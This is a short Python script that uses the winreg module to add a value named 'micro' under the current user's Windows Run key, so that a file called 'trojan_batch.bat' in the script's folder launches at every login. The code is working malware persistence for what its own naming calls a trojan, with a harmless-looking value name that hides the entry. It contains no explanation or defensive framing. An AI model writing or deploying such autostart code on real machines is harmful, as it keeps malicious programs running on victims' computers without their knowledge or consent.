# add script to the registry 
  

from winreg import *  
import winreg as reg  
import os              
  
def AddToRegistry(): 
  
    # __file__ is the instant of 
    # file path where it was executed  
    pth = os.path.dirname(os.path.realpath(__file__)) 
      
    # name of the file with extension 
    s_name="trojan_batch.bat"     
      
    # joins the file name to end of path address 
    address=os.path.join(pth,s_name)  
      
    # key we want to change is HKEY_CURRENT_USER  
    # key value is Software\Microsoft\Windows\CurrentVersion\Run 
    
    key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
      
    # open the key to make changes to 
    open = reg.OpenKey(HKEY_CURRENT_USER,key_value,0,reg.KEY_ALL_ACCESS) 
      
    # modifiy the opened key 
    reg.SetValueEx(open,"micro",0,reg.REG_SZ,address) 
      
    # now close the opened key 
    reg.CloseKey(open) 
  
#  main
if __name__=="__main__": 
    AddToRegistry() 